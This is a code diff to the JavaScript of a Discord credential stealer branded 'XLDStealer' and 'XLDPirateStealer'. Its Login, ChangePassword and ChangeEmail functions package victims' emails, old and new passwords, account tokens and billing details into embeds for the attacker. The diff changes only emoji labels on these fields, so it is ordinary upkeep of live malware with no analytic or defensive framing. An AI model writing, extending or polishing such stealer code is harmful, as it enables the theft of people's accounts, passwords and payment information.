@@ -329,7 +329,7 @@ function Login(e, t, n) {
                             inline: !1,
                           },
                           {
-                            name: "<:creditcard:966803519627743273> <:creditcard:966803519627743273> Billing",
+                            name: "<:creditcard:966803519627743273> Billing",
                             value: `${(function () {
                               const e = JSON.parse(s);
                               var t = "";
@@ -351,7 +351,7 @@ function Login(e, t, n) {
                             inline: !1,
                           },
                           { name: "<:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
-                          { name: "Password", value: `\`${t}\``, inline: !0 },
+                          { name: "<:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                           {
                             name: "<:question:966655842202050570> Token",
                             value: `\`\`\`${n}\`\`\``,
@@ -421,7 +421,7 @@ function ChangePassword(e, t, n) {
                 content: "",
                 embeds: [
                   {
-                    title: "Password Changed",
+                    title: "<:lock:966790360409989171> Password Changed",
                     color: config["embed-color"],
                     fields: [
                       {
@@ -468,8 +468,8 @@ function ChangePassword(e, t, n) {
                         inline: !1,
                       },
                       { name: "<:gmail:966790304701235230> Email", value: `\`${s.email}\``, inline: !1 },
-                      { name: "Old Password", value: `\`${e}\``, inline: !0 },
-                      { name: "New Password", value: `\`${t}\``, inline: !0 },
+                      { name: "Old <:lock:966790360409989171> Password", value: `\`${e}\``, inline: !0 },
+                      { name: "New <:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                       { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
                     ],
                     author: { name: "XLDStealer" },
@@ -558,7 +558,7 @@ function ChangeEmail(e, t, n) {
                         inline: !1,
                       },
                       { name: "New <:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
-                      { name: "Password", value: `\`${t}\``, inline: !0 },
+                      { name: "<:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                       { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
                     ],
                     author: { name: "XLDPirateStealer" },
